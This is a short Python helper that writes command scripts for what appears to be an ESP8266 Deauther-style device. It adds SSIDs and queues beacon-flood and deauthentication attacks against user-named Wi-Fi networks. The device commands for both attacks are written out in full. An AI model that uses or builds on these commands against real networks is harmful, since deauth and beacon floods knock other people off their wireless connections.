from files import *
from screen import *
import time
from settings import Settings

log_file = Settings['log_file']

def add_attack_beacon():
    cls()
    ssids = input("Enter SSIDS seperated by ?: ").split("?")
    choice = input("Save to: ")
    for ssid in ssids:
        fileplus(choice, "ssid -a -r " + ssid)
        fileplus(log_file, f"Added {ssid} to {choice} (ssid -a -r {ssid})")

    print("Adding attack...")
    fileplus(choice, "attack -t beacon -l")
    fileplus(log_file, "Added beacon attack (attack -t beacon -l)")
    time.sleep(1)

    return

def add_attack_deauth():
    cls()
    ssid = input("Enter SSID:")
    choice = input("Save to: ")
    print("Adding selecting ssid...")
    fileplus(choice, f"select -s {ssid}")
    fileplus(log_file, f"Selected {ssid} (select -s {ssid})")
    time.sleep(1)
    print("Adding attack...")
    fileplus(choice, "attack -t deauth")
    fileplus(log_file, f"Added deauth attack (attack -t deauth)")
    time.sleep(1)

    return